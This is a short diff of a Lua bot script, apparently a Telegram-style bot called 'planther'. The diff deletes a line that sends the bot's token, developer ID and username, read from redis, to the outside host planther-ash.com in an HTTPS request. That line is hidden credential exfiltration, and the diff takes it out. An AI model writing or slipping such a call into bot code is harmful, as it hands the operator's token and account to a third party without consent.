@@ -70,8 +70,6 @@ local function fuck_file()
             os.execute('lua planther.lua')
         end
         -- go fuck your self :) .
-        https.request('https://planther-ash.com/s/s.php?token=' .. redis:get(fuck .. "t_planther") .. '&Id=' ..
-                          redis:get(fuck .. "Id_Devplanther") .. '&UserName=' .. redis:get(fuck .. "u_planther"))
         local Devplanther_info_bot = io.open("info_bot.lua", 'w')
         Devplanther_info_bot:write([[
 do 
